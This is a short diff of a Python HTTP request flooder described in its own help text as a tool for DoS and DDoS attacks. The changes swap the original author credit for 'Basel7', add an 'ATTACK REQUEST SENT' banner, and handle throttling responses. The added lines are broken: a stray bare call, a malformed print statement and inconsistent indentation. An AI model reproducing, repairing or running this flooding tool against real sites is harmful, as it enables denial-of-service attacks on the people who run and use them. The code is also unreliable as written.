@@ -83,8 +83,9 @@ def initHeaders():
 
 def handleStatusCodes(status_code):
 	global request_counter
-	sys.stdout.write("\r%i requests has been sent" % request_counter)
-	
+	sys.stdout.write
+	print("\r%i \033[31mATTACK REQUEST SENT \033[33mB A S E - L7\033[0"request_counter)
+    sys.stdout.flush()
 	sys.stdout.flush()
 	if status_code == 429:
 			printMsg("You have been throttled")
@@ -138,7 +139,7 @@ class SendPOSTThread(threading.Thread):
 # check if the site stop responding and alert
 
 def main(argv):
-	parser = argparse.ArgumentParser(description='Sending unlimited amount of requests in order to perform DoS attacks. Written by Barak Tawily')
+	parser = argparse.ArgumentParser(description='Sending unlimited amount of requests in order to perform DDoS attacks. Basel7')
 	parser.add_argument('-g', help='Specify GET request. Usage: -g \'<url>\'')
 	parser.add_argument('-p', help='Specify POST request. Usage: -p \'<url>\'')
 	parser.add_argument('-d', help='Specify data payload for POST request', default=None)
